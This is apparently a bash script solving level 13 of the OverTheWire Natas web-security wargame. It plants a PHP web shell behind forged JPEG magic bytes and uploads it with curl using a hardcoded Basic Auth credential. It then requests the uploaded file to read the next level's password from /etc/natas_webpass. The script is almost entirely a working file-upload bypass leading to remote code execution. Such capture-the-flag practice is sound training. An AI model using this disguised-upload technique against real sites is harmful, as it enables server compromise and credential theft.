#!/bin/bash

echo '1234 <?php echo exec("cat /etc/natas_webpass/natas14"); ?>' > ./image.jpeg
xxd image.jpeg | head

printf '\xff\xd8\xff\xe0' | dd of=image.jpeg bs=1 count=4 conv=notrunc

xxd image.jpeg | head

curl -X POST -F "MAX_FILE_SIZE=1000" \
             -F "filename=4pojslvn45.php" \
             -F "uploadedfile=@image.jpeg" \
             -H "Authorization: Basic bmF0YXMxMzpsVzNqWVJJMDJaS0RCYjhWdFFCVTFmNmVEUm82V0VqOQ==" \
             http://natas13.natas.labs.overthewire.org/index.php \
             -o response.html

base_url="http://natas13.natas.labs.overthewire.org/" 
img_url=$(cat response.html | grep -o 'upload/[a-z0-9]*\.php' | tail -n 1)
full_url="$base_url$img_url"

curl -X GET -H "Authorization: Basic bmF0YXMxMzpsVzNqWVJJMDJaS0RCYjhWdFFCVTFmNmVEUm82V0VqOQ==" \
			$full_url | grep -o '[a-zA-Z0-9]*' 

